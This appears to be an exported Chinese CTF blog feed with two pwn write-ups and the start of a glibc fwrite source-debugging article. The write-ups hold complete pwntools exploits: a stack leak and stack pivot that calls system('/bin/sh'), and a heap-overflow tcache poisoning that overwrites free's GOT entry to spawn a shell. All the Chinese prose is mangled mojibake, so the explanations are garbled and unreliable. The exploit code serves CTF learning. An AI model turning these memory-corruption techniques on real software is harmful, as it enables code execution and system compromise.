title="å¤§è‡´æ€è·¯ï¼š"></a>å¤§è‡´æ€è·¯ï¼š</h3><p>æˆ‘æœ€å¼€å§‹æ³„éœ²çš„æ˜¯IO_2_1_stderrçš„åœ°å€ï¼Œä½†æ˜¯è¿™æ ·åšçš„åæœå°±æ˜¯æœåˆ°äº†å°†è¿‘ä¸¤ç™¾ä¸ªç‰ˆæœ¬çš„libcåº“ï¼Œå› æ­¤æ³„éœ²setbufferå‡½æ•°çš„çœŸå®åœ°å€ã€‚</p><p>æ³„éœ²çš„æ€è·¯æå‰è®¡ç®—å¥½è¦æ³„éœ²çš„ä½ç½®ï¼Œç„¶åå°†è¿™äº›ä½ç½®å¸ƒç½®æˆ<code>-</code> å…¶ä»–ä½ç½®åˆ™å¡«å……æˆåƒåœ¾æ•°æ®ï¼Œå¦‚æœæ˜¯å…­å­—èŠ‚çš„æ ˆåœ°å€ï¼Œåˆ™åªå¡«å……å…­å­—èŠ‚çš„<code>-</code>ï¼Œå¦å¤–ä¸¤å­—èŠ‚è¡¥æˆåƒåœ¾æ•°æ®ï¼Œé¿å…è®©00æˆªæ–­%sã€‚</p><p>å¾—åˆ°æ³„éœ²çš„å†…å®¹ä¹‹åå°±æ˜¯ä¸€ä¸ªç®€å•çš„æ ˆè¿ç§»ï¼Œæå‰å¸ƒç½®systemå‡½æ•°ä»¥åŠå‚æ•°åœ¨æ ˆä¸­ï¼Œæ”¹å†™rbpï¼Œæœ€åç”¨leave;retæŒ‡ä»¤å®Œæˆè¿ç§»è·å–shellã€‚</p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP:"></a>EXP:</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">autofill_long_libc</span>(<span class="params">target_vul,leak_addr</span>):</span><br><span class="line">    obj = LibcSearcher(target_vul, leak_addr)</span><br><span class="line">    libc_base = leak_addr - obj.dump(target_vul)</span><br><span class="line">    sys_addr = libc_base + obj.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">    bin_sh_addr = libc_base + obj.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;libc_base----&gt;&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    <span class="keyword">return</span> sys_addr, bin_sh_addr</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">autofill_local_libc</span>(<span class="params">target_vul,leak_addr,libc</span>):</span><br><span class="line">    libc_base = leak_addr - libc.symbols[target_vul]</span><br><span class="line">    sys_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    bin_sh_addr = libc_base + libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;libc_base----&gt;&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    <span class="keyword">return</span> sys_addr,bin_sh_addr</span><br><span class="line"><span class="comment">#p=remote(&#x27;123.57.69.203&#x27;,7020)</span></span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Hello CTFer! Welcome to the world of pwn~\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xa8</span>):</span><br><span class="line">    sleep(<span class="number">0.01</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;18&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x6</span>):</span><br><span class="line">    sleep(<span class="number">0.01</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;leak libc_base&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1a</span>):</span><br><span class="line">    sleep(<span class="number">0.01</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;19&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">0x6</span>):</span><br><span class="line">    sleep(<span class="number">0.01</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;leak base&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    sleep(<span class="number">0.01</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;120&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    sleep(<span class="number">0.01</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;leak canary&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x3</span>):</span><br><span class="line">    sleep(<span class="number">0.01</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;21&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">a=p.recv()</span><br><span class="line">setbuffer_addr=u64(a[<span class="number">0xb7</span>:<span class="number">0xbd</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">231</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;setbuffer_addr--------------------&gt;&#x27;</span>,<span class="built_in">hex</span>(setbuffer_addr))</span><br><span class="line">base=u64(a[<span class="number">0xd7</span>:<span class="number">0xdd</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x10a0</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;base-------------------------------&gt;&#x27;</span>,<span class="built_in">hex</span>(base))</span><br><span class="line">leak_stack=u64(a[<span class="number">0xdf</span>:<span class="number">0xe5</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;leak_stack--------------------------&gt;&#x27;</span>,<span class="built_in">hex</span>(leak_stack))</span><br><span class="line">canary=u64(a[<span class="number">0xe8</span>:<span class="number">0xef</span>].rjust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;canary------------------------------&gt;&#x27;</span>,<span class="built_in">hex</span>(canary))</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment">#result=autofill_long_libc(&#x27;setbuffer&#x27;,setbuffer_addr)</span></span><br><span class="line">result=autofill_local_libc(<span class="string">&#x27;setbuffer&#x27;</span>,setbuffer_addr,libc)</span><br><span class="line">sys_addr=result[<span class="number">0</span>]</span><br><span class="line">bin_sh_addr=result[<span class="number">1</span>]</span><br><span class="line">pop_rdi_addr=base+<span class="number">0x130b</span></span><br><span class="line">leave_addr=base+<span class="number">0x124a</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bin_sh_addr))</span><br><span class="line"></span><br><span class="line">payload=p64(pop_rdi_addr)+p64(bin_sh_addr)+p64(sys_addr)</span><br><span class="line">payload=payload.ljust(<span class="number">0xd8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p64(canary)+p64(leak_stack-<span class="number">0x1d0</span>-<span class="number">8</span>)+p64(leave_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><h3 id="ä¿æŠ¤ç­–ç•¥ï¼š-1"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š-1" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h3><p><img src="https://s2.loli.net/2022/06/06/na2BjIT164gkDYh.png" alt="image-20220531215015771"></p><h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><img src="https://s2.loli.net/2022/06/06/x42Uh5sgZFwN9lt.png" alt="image-20220531215332239" style="zoom: 50%;" /><p>å­˜åœ¨å †æº¢å‡ºï¼Œè™½ç„¶é¢˜ç›®æ˜¯å«åšunlinkï¼Œä½†æ˜¯æˆ‘è¯•äº†ä¸€ä¸‹ï¼Œä¼¼ä¹unlinkåšä¸å‡ºæ¥ï¼ˆå¯èƒ½æ˜¯æˆ‘å¤ªèœäº†ï¼‰ã€‚å³ä½¿patchupæˆ2.23çš„ï¼Œç­‰unlinkä¹‹åï¼Œptr&#x3D;&amp;ptr-0x18ï¼Œå†å¾€fake_chunkå†™å…¥æ•°æ®ï¼Œæ•°æ®ä¼šè¦†ç›–æ‰stdinæŒ‡é’ˆã€‚å¯¼è‡´ç¨‹åºæ— æ³•å†è¾“å…¥äº†ã€‚å› æ­¤ç”¨unlinkçš„æ–¹æ³•å°±å¡ä½äº†ã€‚</p><p>ä¸è¿‡è¿™é“é¢˜æ˜¯2.27çš„ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨æº¢å‡ºæ‰“tcache attackã€‚</p><h3 id="å¤§è‡´æ€è·¯"><a href="#å¤§è‡´æ€è·¯" class="headerlink" title="å¤§è‡´æ€è·¯"></a>å¤§è‡´æ€è·¯</h3><p>å…ˆç”³è¯·ä¸¤ä¸ªchunkï¼Œä½åœ°å€çš„chunkä½œä¸ºæº¢å‡ºå †å—ã€‚ç„¶åé‡Šæ”¾æ‰é«˜åœ°å€çš„chunkï¼Œåˆ©ç”¨æº¢å‡ºä¿®æ”¹tcachebinä¸­chunkçš„fdæŒ‡é’ˆï¼ˆ<strong>è¿™ä¸ªfdæŒ‡é’ˆä¿®æ”¹æˆå“ªï¼Œæ¥ä¸‹æ¥ç”³è¯·çš„chunkçš„åœ°å€å°±åœ¨å“ªã€‚ä¸è¿‡ç”±äºä»tcachebinä¸­ç”³è¯·chunkæ—¶ï¼Œä¼šå°†å…¶çš„bkæŒ‡é’ˆçš„ä½ç½®èµ‹å€¼æˆ0ï¼Œå¦‚æœfdä¿®æ”¹æˆäº†ä¸€ä¸ªä¸å¯å†™çš„åœ°å€ï¼Œç¨‹åºåœ¨è¿™é‡Œå°±ä¼šå´©æºƒæ‰ï¼‰</strong></p><p>æˆ‘ä»¬fdæŒ‡é’ˆä¿®æ”¹ä¸ºcmdçš„åœ°å€</p><p><img src="https://s2.loli.net/2022/06/06/Mz1N8jpf2ZbKUrB.png" alt="image-20220531231430009"></p><p>å®ƒä½äºbssæ®µï¼Œæ˜¯å¯å†™çš„ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥å°†å®ƒç”³è¯·åˆ°bssæ®µä¸Šï¼Œå†å¾€è¿™ä¸ªchunké‡Œå†™å…¥æ•°æ®æ—¶ï¼Œå°±ä¿®æ”¹äº†bssæ®µä¸Šå­˜å‚¨çš„chunkåœ°å€ï¼Œå°†chunkåœ°å€æ”¹ä¸ºfreeå‡½æ•°çš„gotè¡¨ï¼Œå†å¯¹è¿™ä¸ªchunkè¿›è¡Œä¿®æ”¹ï¼Œå³å¯ä¿®æ”¹freeçš„gotè¡¨ã€‚</p><p>åŒæ—¶è¦è€ƒè™‘åˆ°ä¿®æ”¹å®Œgotè¡¨åï¼Œä¸‹ä¸€æ¬¡è¾“å…¥çš„æ•°æ®ä¾æ—§å†å¾€gotè¡¨é‡Œè¾“å…¥ï¼Œè¿™å°±æ„å‘³ç€æˆ‘ä»¬æ— æ³•å…ˆä¿®æ”¹freeçš„çœŸå®åœ°å€ä¸ºsystemï¼Œå†ä¼ å…¥&#x2F;bin&#x2F;sh**ï¼ˆå› ä¸ºä¸‹å›ä¼ &#x2F;bin&#x2F;shçš„æ—¶å€™ï¼Œfreeçš„çœŸå®åœ°å€åˆè¢«æ”¹æˆäº†&#x2F;bin&#x2F;shï¼‰<u>å› æ­¤éœ€è¦ä¼ å‚å’Œä¿®æ”¹gotè¡¨åŒæ—¶è¿›è¡Œ</u>**ã€‚è¿™é“é¢˜å› ä¸ºgotè¡¨ä¸­çš„freeå’Œstrncmpæ˜¯æŒ¨ç€çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åŠ«æŒfreeçš„gotè¡¨ï¼Œå¾€é‡Œé¢å†™å…¥&#x2F;bin&#x2F;sh\x00å’Œsystemçš„pltåœ°å€ï¼Œæ­¤æ—¶å­—ç¬¦ä¸²çš„å¼€å¤´åˆ™ä¸º&#x2F;bin&#x2F;sh\x00ï¼ˆä¹Ÿå°±æ˜¯ä¹‹åstrncmpçš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼‰ã€‚åŒæ—¶ä¹Ÿå°†systemçš„pltåœ°å€å†™å…¥åˆ°äº†strncmpä¸­ï¼Œç­‰åˆ°æ‰§è¡Œstrncmpçš„æ—¶å€™ï¼ŒæˆåŠŸè·å–shellã€‚</p><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">toolsæºç </a></p><h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">debug(p,<span class="number">0x4009BD</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,lenth,content</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;add&#x27;</span>)</span><br><span class="line">    <span class="comment">#p.sendline(fake_chunk)</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Size: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(lenth))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;remove&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">bss_addr=<span class="number">0x6010B0</span></span><br><span class="line">back_addr=<span class="number">0x400896</span></span><br><span class="line">sys_addr=e.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_got_addr=e.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x40</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#overflow_chunk</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x30</span>,<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">remove(<span class="number">0</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">payload=<span class="number">72</span>*<span class="string">b&#x27;a&#x27;</span>+p64(<span class="number">0x41</span>)+p64(bss_addr)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x40</span>,payload)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x30</span>,<span class="string">b&#x27;bb&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x30</span>,p64(free_got_addr))</span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(sys_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> èµ›é¢˜WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ </tag>
            
            <tag> ç¯¡æ”¹gotè¡¨ </tag>
            
            <tag> å †æº¢å‡º </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IOå­¦ä¹ --æºç è°ƒè¯•fwriteå‡½æ•°</title>
      <link href="/posts/7b71046d.html"/>
      <url>/posts/7b71046d.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰ç½®çŸ¥è¯†ï¼š"><a href="#å‰ç½®çŸ¥è¯†ï¼š" class="headerlink" title="å‰ç½®çŸ¥è¯†ï¼š"></a>å‰ç½®çŸ¥è¯†ï¼š</h2><p>è¿™ä¸ªfwriteå‡½æ•°ä¸­çš„_IO_write_ptræŒ‡é’ˆçš„æŒªåŠ¨å’Œfreadå‡½æ•°ä¸­çš„_IO_read_ptræŒ‡é’ˆçš„æŒªåŠ¨æ˜¯ä¸å¤ªä¸€æ ·çš„ã€‚å…ˆå›é¡¾ä¸€ä¸‹ä¸Šä¸€ç¯‡æ–‡ç« ä¸­_IO_read_ptræŒ‡é’ˆä»€ä¹ˆæ—¶å€™æŒªåŠ¨ï¼Ÿå½“ç³»ç»Ÿè°ƒç”¨readçš„æ—¶å€™ä»æ–‡ä»¶ä¸­è¯»å–å¤šå°‘ä¸ªå­—èŠ‚çš„æ•°æ®åˆ°è¾“å…¥ç¼“å†²åŒºï¼Œå°±å°†_IO_read_endæŒ‡é’ˆæŒªåŠ¨å¤šå°‘ä¸ªå­—èŠ‚**(åˆå§‹å€¼å’Œ_IO_read_baseæ˜¯ä¸€æ ·çš„)<strong>ï¼Œè€Œæ­¤æ—¶çš„_IO_read_ptræŒ‡é’ˆä¸åŠ¨ã€‚å½“æ‰§è¡Œmemcpyå‡½æ•°å°†æ•°æ®ä»è¾“å…¥ç¼“å†²åŒºæ‹·è´å¤šå°‘ä¸ªå­—èŠ‚çš„æ•°æ®åˆ°æˆ‘ä»¬æŒ‡å®šçš„å†…å­˜åœ°å€ï¼Œå°±å°†_IO_read_ptræŒ‡é’ˆæŒªåŠ¨å¤šå°‘ä¸ªå­—èŠ‚ã€‚</strong>åœ¨_IO_read_baseå’Œ_IO_read_pträ¹‹é—´æ˜¯å·²ç»æ‹·è´è¿‡çš„æ•°æ®ï¼Œ_IO_read_ptrå’Œ_IO_read_endä¹‹é—´æ˜¯è¾“å…¥ç¼“å†²åŒºä¸­è¿˜æœªæ‹·è´çš„æ•°æ®ã€‚**</p><p>è€Œæœ¬æ¬¡åˆ†æçš„<strong>fwriteå‡½æ•°åˆ™æ˜¯ç›´æ¥å°†_IO_buf_endçš„å€¼èµ‹ç»™äº†_IO_write_end</strong>ï¼ˆreadçš„é‚£ä¸ªæŒ‡é’ˆå¯ä¸æ˜¯è¿™æ ·ï¼‰ï¼Œè€Œ_IO_write_ptrçš„åˆå§‹å€¼åˆ™å’Œ_IO_write_baseçš„å€¼ä¸€æ ·ã€‚è¯¥å‡½æ•°å…ˆä»æŒ‡å®šçš„å†…å­˜åœ°å€è¯»å–ä¸€å®šå­—èŠ‚çš„æ•°æ®åˆ°è¾“å‡ºç¼“å†²åŒºï¼Œæ­¤æ—¶çš„_IO_write_ptræŒ‡é’ˆæŒªåŠ¨(æˆ‘è¿™é‡Œä»¥åŠä¸Šä¸‹æ–‡æåˆ°çš„æŒªåŠ¨æŒ‡çš„éƒ½æ˜¯åœ¨åŸæœ¬çš„åŸºç¡€ä¸ŠåŠ )ç›¸åº”çš„å­—èŠ‚ã€‚æ­¤æ—¶çš„<strong>_IO_write_baseæŒ‡é’ˆå’Œ_IO_write_ptræŒ‡é’ˆä¹‹é—´çš„åŒºåŸŸæ˜¯å°†è¦ä»è¾“å‡ºç¼“å†²åŒºå†™å…¥æ–‡ä»¶çš„æ•°æ®ï¼Œè€Œ_IO_write_ptræŒ‡é’ˆå’Œ_IO_write_endæŒ‡é’ˆä¹‹é—´çš„åŒºåŸŸæ˜¯è¾“å‡ºç¼“å†²åŒºçš„å¯ç”¨åŒºåŸŸ(å°±æ˜¯è¿˜èƒ½å†å¾€è¾“å‡ºç¼“å†²åŒºæ‹·è´å¤šå°‘ä¸ªå­—èŠ‚çš„å†…å®¹)<strong>ï¼Œå½“æ‰§è¡Œç³»ç»Ÿè°ƒç”¨writeå¾€æ–‡ä»¶ä¸­å†™å…¥ä¸€å®šçš„å­—èŠ‚çš„å†…å®¹åï¼Œ_IO_write_ptrå°±ä¼š</strong>å‡å»ç›¸åº”çš„å­—èŠ‚</strong>ã€‚</p><p>ä¸Šé¢çš„å†…å®¹ä¸€å®šè¦æ¸…æ¥šï¼Œä¸ç„¶åˆ†æçš„æ—¶å€™å°±ä¼šé™·å…¥è¯¯åŒº</p><p>å‰é¢ä¸¤ç¯‡æ–‡ç« çš„åœ°å€å¦‚ä¸‹ï¼š</p><p><a href="https://www.cnblogs.com/ZIKH26/articles/16567446.html">IOå­¦ä¹ â€“æºç è°ƒè¯•fopenå‡½æ•°</a></p><p><a href="https://www.cnblogs.com/ZIKH26/articles/16575066.html">IOå­¦ä¹ â€“æºç åˆ†æfreadå‡½æ•° </a></p><h2 id="æ•´ä½“æµç¨‹ï¼š"><a href="#æ•´ä½“æµç¨‹ï¼š" class="headerlink" title="æ•´ä½“æµç¨‹ï¼š"></a>æ•´ä½“æµç¨‹ï¼š</h2><p><img src="/../img/image-20221007220914882.png" alt="image-20221007220914882"></p><img src="https://s2.loli.net/2022/08/12/iUOa84sphV1Wmyw.png" alt="image-20220811201511246" style="zoom:50%;" /><p>ä¸Šé¢ç¬¬ä¸€å¼ å›¾ç‰‡æ˜¯fwriteå‡½æ•°çš„æ•´ä½“æµç¨‹ï¼Œç¬¬äºŒå¼ å›¾ç‰‡æ˜¯æ ¹æ®æˆ‘ä¸‹é¢å†™çš„è¿™ä¸ªæºä»£ç å¯¹åº”çš„å‡½æ•°è°ƒç”¨æµç¨‹(è°ƒè¯•çš„æ—¶å€™ç»“åˆè¿™ä¸¤ä¸ªå›¾ç‰‡ï¼Œå¯ä»¥å¯¹è‡ªå·±è°ƒè¯•åˆ°å“ªéƒ¨åˆ†æœ‰ä¸ªæ¯”è¾ƒæ¸…æ¥šçš„è®¤çŸ¥)ã€‚</p><h2 id="æºä»£ç ï¼š"><a href="#æºä»£ç ï¼š" class="headerlink" title="æºä»£ç ï¼š"></a>æºä»£ç ï¼š</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> value[<span class="number">20</span>];</span><br><span class="line">    <span class="type">char</span> new[<span class="number">30</span>]=<span class="string">&quot;nice-day&quot;</span>;</span><br><span class="line">    FILE* fp=fopen(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;wt&quot;</span>);</span><br><span class="line">    fwrite(new,<span class="number">1</span>,<span class="number">25</span>,fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æœ¬æ–‡çš„æºä»£ç ä»¥åŠè°ƒè¯•çš„ç¨‹åºæ‰€ä¾èµ–çš„libcéƒ½ä¸º2.23ç‰ˆæœ¬çš„</strong></p><h2 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h2><p>_IO_fwrite æºä»£ç (fwriteåŸå‹ä¸º_IO_fwriteå‡½æ•°)å¦‚ä¸‹ï¼Œè¿™æ®µå¾ˆå¥½åˆ†æï¼Œå…ˆæ˜¯åˆ¤æ–­äº†requestï¼ˆä¹Ÿå°±æ˜¯æˆ‘ä»¬è¦è¾“å…¥çš„å­—èŠ‚æ•°æ˜¯å¦ä¸º0ï¼‰ï¼Œç„¶ååŠ é”å»æ‰§è¡Œ_IO_sputnå‡½æ•°(è¯¥å‡½æ•°æ˜¯vtableä¸­çš„_IO_new_file_xsputnå‡½æ•°)ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_fwrite (<span class="type">const</span> <span class="type">void</span> *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t request = size * count;</span><br><span class="line">  _IO_size_t written = <span class="number">0</span>;</span><br><span class="line">  CHECK_FILE (fp, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (request == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span> || _IO_fwide (fp, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">    written = _IO_sputn (fp, (<span class="type">const</span> <span class="type">char</span> *) buf, request);</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (written == request || written == EOF)</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> written / size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åè¿›å…¥äº†_IO_new_file_xsputnå‡½æ•°ï¼Œå…ˆæ˜¯æœ‰ä¸ªifåˆ¤æ–­å¦‚ä¸‹ï¼Œè¿™é‡Œæˆ‘å¾ˆè¿·æƒ‘ï¼Œå› ä¸ºæˆ‘ä¸æ¸…æ¥š_flagså¯¹åº”çš„å„ä¸ªä½éƒ½æ˜¯ä»€ä¹ˆå«ä¹‰ï¼Œå°½ç®¡<strong>é€šè¿‡è°ƒè¯•å¯ä»¥çœ‹å‡ºæ¥è¿™ä¸ªifå¹¶æ²¡æœ‰è¿›å»</strong>ï¼Œä½†å®é™…ä¸Šæˆ‘å¹¶ä¸çŸ¥é“ä¸ºä»€ä¹ˆè¿™ä¸ªifè¿›ä¸å»ï¼Œæˆ‘ä¸Šç½‘æ‰¾äº†å¾ˆå¤šèµ„æ–™ä¹Ÿæ²¡æœ‰æ‰¾åˆ°ç›¸å…³_flagså„ä¸ªä½çš„å«ä¹‰ï¼Œé‚£å°±ç»§ç»­å¾€ä¸‹åˆ†æå§ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">   &#123;</span><br><span class="line">     count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;</span><br><span class="line">     <span class="keyword">if</span> (count &gt;= n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *p;</span><br><span class="line">  <span class="keyword">for</span> (p = s + n; p &gt; s; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (*--p == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  count = p - s + <span class="number">1</span>;</span><br><span class="line">  must_flush = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœæ²¡æœ‰è¿›å…¥ä¸Šé¢çš„ifï¼Œåˆ™ä¼šå»åˆ¤æ–­æ˜¯å¦è¿˜å­˜åœ¨å‰©ä½™çš„è¾“å‡ºç¼“å†²åŒºï¼ˆå¦‚ä¸‹ï¼‰ï¼Œcountæ˜¯å‰©ä½™è¾“å‡ºç¼“å†²åŒºçš„å¤§å°ï¼Œto_doæ˜¯éœ€è¦å¾€æ–‡ä»¶ä¸­å†™å…¥çš„å­—èŠ‚æ•°ã€‚</p><p>æ ¹æ®ä¸‹é¢è¿™æ®µä»£ç åˆ†æï¼Œç°åœ¨æœ‰ä¸‰ç§æƒ…å†µåˆ†åˆ«æ˜¯count&gt;to_do    count&lt;to_do    count&#x3D;&#x3D;0</p><p>ç¬¬ä¸€ç§æ˜¯å‰©ä½™çš„è¾“å‡ºç¼“å†²åŒºæ¯”æˆ‘ä»¬è¦è¾“å…¥çš„æ•°æ®å¤§ï¼Œé‚£memcpyæ‰§è¡Œåå°†æ•°æ®æ‹·è´åˆ°è¾“å‡ºç¼“å†²åŒºå°±å®Œäº‹å¤§å‰ï¼Œå› ä¸ºif (to_do + must_flush &gt; 0)è¿™è¡Œä»£ç 